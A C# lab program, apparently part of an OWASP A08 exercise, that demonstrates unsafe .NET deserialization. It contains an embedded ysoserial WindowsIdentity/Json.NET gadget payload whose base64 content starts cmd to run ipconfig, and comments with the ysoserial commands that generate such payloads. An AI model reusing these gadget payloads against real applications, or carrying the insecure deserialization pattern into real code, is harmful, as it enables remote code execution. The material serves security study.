using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Claims;
using System.Security.Principal;

internal class Program
{
    private static void Main(string[] args)
    {
        int index;
        Tuple<string, string> classFormatterPair;
        string command;
        string serializedOutput;

        Console.WriteLine("******************************************");
        Console.WriteLine("***** Unsafe deserialization in .NET *****");
        Console.WriteLine("******************************************");

        index = 1;
        classFormatterPair = new Tuple<string, string>("ClaimIdentity", "BinaryFormatter");

        // Use case 1 - ClaimIdentity and BinaryFormatter
        PrintSummary(index, classFormatterPair, string.Empty, string.Empty);

        try
        {
            var claims = new List<Claim>()
            {
                new Claim(ClaimTypes.Name, "Iván"),
                new Claim(ClaimTypes.Role, "Admin"),
                new Claim(ClaimTypes.Email, "invented@gmail.com"),
                new Claim(ClaimTypes.AuthenticationMethod, "http://schemas.microsoft.com/ws/2008/06/identity/authenticationmethod/password")
            };

            var claimsIdentity = new ClaimsIdentity(claims);

            using (var memoryStream = new MemoryStream())
            {
#pragma warning disable SYSLIB0011 // Type or member is obsolete
                var binaryFormatter = new BinaryFormatter();
#pragma warning restore SYSLIB0011 // Type or member is obsolete

                binaryFormatter.Serialize(memoryStream, claimsIdentity);
            }
        }
        catch (Exception ex)
        {
            PrintError(index, ex.Message);
        }
        finally
        {
            PrintBottomMessage(index);
        }

        index++;
        classFormatterPair = new Tuple<string, string>("WindowsIdentity", "Json.NET");
        command = @"ysoserial.exe - o raw - g WindowsIdentity - f Json.Net - c calc > ""C:\Users\IMS\Desktop\main\3. PROJECTS\sharp-circles\4. LABS\OWASP-10-A08-software-and-data-integrity\Payloads\payload-use-case-2.txt""";
        serializedOutput = @"{
                    '$type': 'System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                    'System.Security.ClaimsIdentity.actor': 'AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA6wU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGlwY29uZmlnICZndDsgJnF1b3Q7QzpcVXNlcnNcSU1TXERlc2t0b3BcbmV0Y29uZmlnLnR4dCZxdW90OyIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4L'
                }";

        // Use case 2 - WindowsIdentity and Json.NET
        PrintSummary(index, classFormatterPair, command, serializedOutput);

        try
        {
            var windowsIdentity = JsonConvert.DeserializeObject<WindowsIdentity>(serializedOutput);
        }
        catch (Exception ex)
        {
            PrintError(index, ex.Message);
        }
        finally
        {
            PrintBottomMessage(index);
        }


    }

    private static void PrintSummary(int index, Tuple<string, string> classFormatterPair, string command, string serializedOutput)
    {
        var summaryMessage = $@"-- Use case {index} -- [{classFormatterPair.Item1} - {classFormatterPair.Item2}]
    
Starting use case {index}
    
[Summary]

Gadget chain: {classFormatterPair.Item1}
Formatter: {classFormatterPair.Item2}
Command: {(string.IsNullOrWhiteSpace(command) ? "Non applicable" : command)}
Serialized output: {(string.IsNullOrWhiteSpace(serializedOutput) ? "Non applicable" : serializedOutput)}";

        Console.WriteLine();
        Console.WriteLine(summaryMessage);
    }

    private static void PrintError(int index, string message)
    {
        Console.WriteLine();
        Console.WriteLine($"[Use case {index}] - Error: {message}");
    }

    private static void PrintBottomMessage(int index)
    {
        Console.WriteLine();
        Console.WriteLine($"Use case {index} completed");
    }
}

/*

Json.NET commands

ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -c calc > "C:\Users\IMS\Desktop\main\3. PROJECTS\sharp-circles\4. LABS\OWASP-10-A08-software-and-data-integrity\Payloads\payload-use-case-2.txt"
ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -c "ipconfig > \"C:\Users\IMS\Desktop\netconfig.txt\"" > "C:\Users\IMS\Desktop\main\3. PROJECTS\sharp-circles\4. LABS\OWASP-10-A08-software-and-data-integrity\Payloads\payload-use-case-3.txt"
*/